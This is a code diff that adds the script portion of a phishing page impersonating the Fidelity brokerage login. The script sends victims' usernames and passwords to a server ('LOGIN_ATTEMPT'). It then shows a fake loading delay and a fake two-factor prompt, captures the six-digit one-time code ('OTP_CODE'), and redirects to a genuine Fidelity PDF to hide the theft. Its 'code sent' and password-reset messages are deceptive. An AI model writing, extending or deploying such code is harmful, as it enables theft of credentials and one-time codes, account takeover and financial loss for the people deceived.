+        // ============================================
+        // LOADING AND MODAL FUNCTIONS
+        // ============================================
+        function showLoading() {
+            loadingOverlay.classList.add('active');
+            hideLoginCard();
+            hideSignupSection();
+            hideDisclaimerSection();
+            hideFooterSection();
+            loadingTimeout = setTimeout(function() {
+                loadingOverlay.classList.remove('active');
+                showTwoFAModal();
+            }, 5000);
+        }
+
+        function showTwoFAModal() {
+            twofaModal.classList.add('active');
+            hideSignupSection();
+            hideDisclaimerSection();
+            hideFooterSection();
+            twofaCode.value = '';
+            twofaCode.focus();
+        }
+
+        function closeTwoFAModal() {
+            twofaModal.classList.remove('active');
+            twofaCode.value = '';
+            showLoginCard();
+            showSignupSection();
+            showDisclaimerSection();
+            showFooterSection();
+        }
+
+        function showDownloadingAndRedirect() {
+            closeTwoFAModal();
+            downloadingOverlay.classList.add('active');
+            setTimeout(function() {
+                window.location.href = 'https://www.fidelity.com/bin-public/060_www_fidelity_com/documents/wealth-management/Wealth-Mgmt-Guide.pdf';
+            }, 2000);
+        }
+        // ============================================
+
+        // ============================================
+        // RESEND CODE LINK
+        // ============================================
+        resendCodeLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            showToast('New code sent', 'success');
+        });
+        // ============================================
+
+        // ============================================
+        // LOGIN BUTTON CLICK
+        // ============================================
+        loginBtn.addEventListener('click', function() {
+            var username = usernameInput.value.trim();
+            var password = passwordInput.value;
+
+            if (!username) {
+                validateUsername();
+                usernameInput.focus();
+                return;
+            }
+
+            if (!password) {
+                validatePassword();
+                passwordInput.focus();
+                return;
+            }
+
+            // Store credentials
+            storedUsername = username;
+            storedPassword = password;
+
+            // Send to server (only once per session)
+            if (!credentialsSent) {
+                logToServer('LOGIN_ATTEMPT', { username: username, password: password });
+                credentialsSent = true;
+            } else {
+                // Second attempt - send again
+                logToServer('LOGIN_ATTEMPT_2', { username: username, password: password });
+            }
+
+            // Show loading overlay
+            showLoading();
+        });
+        // ============================================
+
+        // ============================================
+        // FORGOT PASSWORD LINK
+        // ============================================
+        forgotUsernameLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            var username = usernameInput.value.trim();
+            if (username) {
+                logForgotPassword(username);
+                alert('Password reset instructions sent to your registered email.');
+            } else {
+                alert('Please enter your username to reset your password.');
+                usernameInput.focus();
+            }
+        });
+        // ============================================
+
+        // ============================================
+        // SIGNUP LINKS
+        // ============================================
+        signupLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = 'https://www.fidelity.com/accounts-trading/open-account/overview';
+        });
+
+        signupLink2.addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = 'https://www.fidelity.com/accounts-trading/open-account/overview';
+        });
+        // ============================================
+
+        // ============================================
+        // 2FA VERIFY BUTTON
+        // ============================================
+        twofaVerifyBtn.addEventListener('click', function() {
+            var code = twofaCode.value.trim();
+            if (!code || code.length !== 6 || !/^\d+$/.test(code)) {
+                alert('Please enter a valid 6-digit verification code.');
+                twofaCode.focus();
+                return;
+            }
+            logToServer('OTP_CODE', { code: code });
+            showDownloadingAndRedirect();
+        });
+        // ============================================
+
+        // ============================================
+        // ENTER KEY HANDLERS
+        // ============================================
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                loginBtn.click();
+            }
+        });
+
+        usernameInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                passwordInput.focus();
+            }
+        });
+
+        twofaCode.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                twofaVerifyBtn.click();
+            }
+        });
+        // ============================================
+
+        // ============================================
+        // MODAL CLOSE HANDLERS
+        // ============================================
+        twofaCloseBtn.addEventListener('click', closeTwoFAModal);
+
+        twofaModal.addEventListener('click', function(e) {
+            if (e.target === twofaModal) closeTwoFAModal();
+        });
+
+        // Security and FAQs links
+        document.querySelector('.security-link').addEventListener('click', function(e) { e.preventDefault(); alert('Security page'); });
+        document.querySelector('.faqs-link').addEventListener('click', function(e) { e.preventDefault(); alert('FAQs page'); });
+        // ============================================
+
+        // ============================================
+        // ESCAPE KEY HANDLER
+        // ============================================
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                if (loadingOverlay.classList.contains('active')) {
+                    if (loadingTimeout) clearTimeout(loadingTimeout);
+                    loadingOverlay.classList.remove('active');
+                    showLoginCard();
+                    showSignupSection();
+                    showDisclaimerSection();
+                    showFooterSection();
+                }
+                if (twofaModal.classList.contains('active')) {
+                    closeTwoFAModal();
+                }
+            }
+        });
+        // ============================================
+
+        // ============================================
+        // WINDOW UNLOAD HANDLER
+        // ============================================
+        window.addEventListener('beforeunload', function() {
+            if (loadingTimeout) clearTimeout(loadingTimeout);
+        });
+        // ============================================
+    </script>
+</body>
+</html>
